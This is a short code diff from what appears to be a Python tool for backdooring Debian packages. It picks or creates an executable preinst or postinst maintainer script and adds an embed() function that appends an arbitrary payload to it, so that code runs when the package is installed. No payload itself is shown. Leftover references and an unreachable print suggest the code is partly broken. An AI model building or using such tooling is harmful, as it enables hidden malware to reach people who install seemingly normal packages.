@@ -88,29 +88,31 @@ print(debpath)
 
 postinst = debpath+"DEBIAN/postinst"
 preinst = debpath+"DEBIAN/preinst"
-prerm = debpath+"DEBIAN/prerm"
-postrm = debpath+"DEBIAN/postrm"
-injectablefile = ""
 
 
 def checkforinjectablefile():
-	global postrm,preinst,postrm,prerm,injectablefile
-	
+	global postrm,preinst
+	if os.path.exists(postinst) or os.path.exists(preinst):
+		if os.path.exists(preinst):
+			return preinst
+		else:
+			return postinst	
 
-	if os.path.exists(postinst):
-		injectablefile = postinst
-
-	if os.path.exists(preinst):
-		injectablefile = preinst
-
-	if os.path.exists(postrm):
-		injectablefile = postrm
-
-	if os.path.exists(prerm):
-		injectablefile = prerm
+	else:
+		file = open(preinst,'w+')
+		file.close()
+		os.chmod(preinst,0o755)
+		return preinst
 
 
-	
 	print("this function working fine!!")
 
 checkforinjectablefile()
+
+
+def embed(script: str, payload: str):
+	file = open(script,'a')
+	file.write(payload)
+	file.close()
+
+
